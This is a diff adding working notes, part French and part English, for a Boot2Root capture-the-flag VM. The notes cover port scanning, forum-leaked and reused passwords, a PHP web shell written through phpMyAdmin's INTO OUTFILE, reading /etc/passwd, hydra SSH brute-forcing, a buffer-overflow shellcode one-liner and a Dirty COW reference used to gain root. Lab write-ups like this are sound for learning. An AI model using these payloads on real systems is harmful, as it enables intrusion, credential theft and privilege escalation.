@@ -1,0 +1,251 @@
+Les deux VMs sont sur le même réseau NAT.
+
+On récupère la liste des IP avec
+	arp -n
+
+Nous scannons avec
+	nmap -sT -O 10.0.2.0/24
+afin de trouver l'ip utilisée par la VM Boot2Root
+
+Nous remarquons un certain nombre de services pour une des IPs, il s'agit
+sans aucun doute de celui de la VM.
+
+L'ip de la VM est 10.0.2.5
+
+Ensuite nous scannons tous les ports avec
+	nmap -sS -sV -O -p0-65535 -T5 10.0.2.5
+afin de s'assurer qu'il n'y a pas un autre service sur un des autres ports...
+-sS: SYN scanning
+-sV: Gets banners from each service
+-O: OS detection
+-p---: ports
+-T5: run at full speed
+
+Voici une partie du résultat:
+Not shown: 65530 closed ports
+PORT		STATE		SERVICE		VERSION
+21/tcp		open		ftp			vsftpd 2.0.8 or later
+22/tcp		open		ssh			OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp		open		http		Apache httpd 2.2.22 ((Ubuntu))
+143/tcp		open		imap		Dovecot imapd
+443/tcp		open		ssl/http	Apache httpd 2.2.22
+993/tcp		open		ssl/imaps?
+MAC Address: 08:00:27:54:44:30 (Oracle VirtualBox virtual NIC)
+
+=== Port 80: web server ===
+Nous utilisons dirb pour trouver les dossiers présents sur le webserver
+	dirb "http://10.0.2.5"
+GENERATED WORDS: 4612
+
++ http://10.0.2.5:80/cgi-bin/ (CODE:403|SIZE:284)
+==> DIRECTORY: + http://10.0.2.5:80/fonts/
++ http://10.0.2.5:80/forum (CODE:403|SIZE:281)
++ http://10.0.2.5:80/index.html (CODE:200|SIZE:1025)
++ http://10.0.2.5:80/server-status (CODE:403|SIZE:289)
+
+
+	dirb "https://10.0.2.5"
+--> résultat bien plus conséquent, voici les trois principaux dossiers trouvés :
+/cgi-bin/
+/forum/
+/phpmyadmin/
+/server-status
+/webmail/
+
+
+==> Nous nous concentrons sur le forum.
+Topic Probleme login liste de nombreux résultats de commandes, sauvé dans
+~/garbage.txt
+Nous apprenons que :
+- il y a un utilisateur admin qui peut se connecter en ssh mais toujours depuis
+l'IP 62.210.32.157 ; comme nous avons des invalid user pour admin depuis d'autres
+ip, peut-être y a-t-il un accès limité à certaines ip ?
+
+naos
+!q\]Ej?*5K5cy*AJ
+adam / admin / ftpuser / guest / nagios / pi / PlcmSpIp / support / test / ubnt / user
+
+- list of "session closed" :
+lmezard / root
+
+
+-> Liste des utilisateurs du forum (onglet Users)
+admin / lmezard / qudevide / thor / wandre / zaz
+
+
+
+Forum access : lmezard !q\]Ej?*5K5cy*AJ
+Dans son profil, nous voyons que son adresse mail est : laurie@borntosec.net
+
+Dans la DB du forum, on trouve que le forum_email est admin@borntosec.net
+Liste des mails users:
+admin@borntosec.net
+qudevide@borntosec.net
+thor@borntosec.net
+wandre@borntosec.net
+laurie@borntosec.net
+zaz@borntosec.net
+
+=== WEBMAIL ===
+Laurie a utilisé le même mdp pour le webmail, avec son adresse laurie@borntosec.net
+ft_root@mail.borntosec.net
+qudevide@mail.borntosec.net
+
+=== ISO ===
+son adresse email (laurie@borntosec.net) et le mot de passe du webmail (!q\]Ej?*5K5cy*AJ) permet egalement de ce connecter a la VM
+NB: Il est nécessaire d'entrer ces identifiants deux fois correctement pour pouvoir se connecter.
+Il ne faut pas que l'interface se "reset" avant la fin de la seconde fois.
+
+
+?? Pourquoi peut-il y avoir les mêmes mails dans sent et dans inbox, comme s'ils
+avaient été forward directement...
+
+Nous avons remarqué que la version de SquirrelMail est la 1.4.22, elle a des failles,
+découvertes depuis 2017 environ. Voir :
+https://www.cvedetails.com/cve/CVE-2017-7692/
+
+
+=== MYSQL - PHPMYADMIN ===
+root Fg-'kKXBj87E:aJ$
+
+Nous avons créé une nouvelle table afin d'utiliser la commande suivante dans la
+console de PHPMYADMIN:
+	LOAD DATA INFILE '/etc/passwd' INTO TABLE `passwd`
+
+Nous découvrons que le chemin que nous recherchions pour inclure un fichier
+contenant du code php est le suivant : /var/www
+
+-> La [documentation](https://github.com/ilosuna/mylittleforum/wiki/Installation) de 
+My Little Forum precise que le chemin '/var/www/forum/templates_c' doit etre
+configure avec un chmod permissif.
+Nous ecrivons donc notre shellcode:
+    SELECT "<pre><?php echo shell_exec($_GET['e']); ?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+et l'executons en escapant (https://fr.wikipedia.org/wiki/Percent-encoding) les parametres:
+    $IP/forum/templates_c/shell.php?e=whoami
+    $IP/forum/templates_c/shell.php?e=ls -la %2F
+    
+Nous avons bien acces a /home!
+A l'interieur nous trouvons un dossier LOOKATME contenant un fichier 'password'
+/home/LOOKATME/password, depuis www-data:
+    lmezard:G!@M6f4Eatau{sF"
+
+Le mot de passe ne fonctionne pas en ssh, meme si laurie est autorisee a se connecter (vus dans /etc/sshd)
+-> Du coup nous avons essayer les services decouvert avec nmap, et les identifiants fonctionnent sur le ftp!
+
+=== FTP ===
+
+cmd:
+    wget ftp://$IP --ftp-user=lmezard --ftp-pass='G!@M6f4Eatau{sF"'
+
+-> 'README' nous indique que nous allons trouver le mdp systeme de laurie,
+file nous indique que le fichier 'fun' est une archive tar
+
+Dans l'archive fun, nous trouvons des fichiers PCAP, il faut les concatener
+pour obtenir un executable
+
+!! VOIR ftp_fun.sh
+
+resultat:
+    laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+    
+=== elf ===
+
+sequence a taper : 
+
+Public speaking is very easy.
+1 2 6 24 120 720
+2b755
+9
+_p5[-1
+4 2 6 3 1 5 
+
+
+ca marche mais "_p5[-1" est une possibiliter, et je ne sais pas laquelle est la bonne
+
+apres "l'indice" des mouettes, apres avec generer tout les mots de passes possible via deux programmes et apres
+les avoir tous essaye avec hydra (hydra -l thor -P all_passords_file ssh://[IP])
+le mot de passe ce trouve etre :
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+secret phase :
+
+Public speaking is very easy.
+1 2 6 24 120 720
+2b755
+9 austinpowers
+_p5[-1
+4 2 6 3 1 5 
+1001
+
+
+=== Misc === 
+
+-> on a acces au hash des passwords dont celui de laurie, on peux changer
+le hash de admin, ce qui nous laisse acceder a la page admin du forum
+
+WAFW00F — This is the Web Application Firewall tool used in Kali Linux to find Web
+Application Firewall. If the WAF (Web Application Firewall) is not detected then
+it’s sure that the server / system can be easily hacked. The below figure shows that WAF
+is not present in the server
+
+
+SET @file = "/var/www/index.html";
+SET @table = "index";
+
+CREATE TABLE @table (`lines` TEXT);
+LOAD DATA INFILE @file INTO TABLE @table;
+
+
+List of users, from /etc/passwd:
+root
+
+
+ft_root
+mysql
+ftp
+lmezard
+laure@borntosec.net
+laurie
+thor
+zaz
+=======
+
+=== zaz password challenge ===
+The file isn't readable at first. To understand it better, we need to have as much
+"similar lines" as possible in order to counter them and only display them one time.
+This is possible because most of the lines are uniques or repeated a lot (around 180 times).
+
+We use vim to remove the \n after the word "degrees":
+- open the file
+- use the command :%s/degrees\n/degrees /g
+- save and quit
+
+Now we can wrap similar lines:
+$> cat file | uniq -c >> simple-file
+
+The new file is much shorter.
+Understanding it is simple: each paragraph corresponds to one letter.
+The "direction" of the drawing is up at first and each go forward or
+backward implies that a line is "drawn".
+
+Then it's really straightforward:
+S
+L
+A
+S
+H
+
+The password is SLASH. But it's too short to be one... The last line is a tip.
+"Digest" invited us to hash it. The md5 is a right algorithm, the hash is the
+right password.
+
+=== root ===
+
+sur zaz on as un overflow basique, on lance la commande :
+`python -c "print('\x90' * 80 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'f' * 15 + '\x70\xf6\xff\xbf')"`
+
+=== Dirty cow ===
+Version kernel vulnerable (uname -a)
+https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c Fonctionne!
+TODO: proper writeup
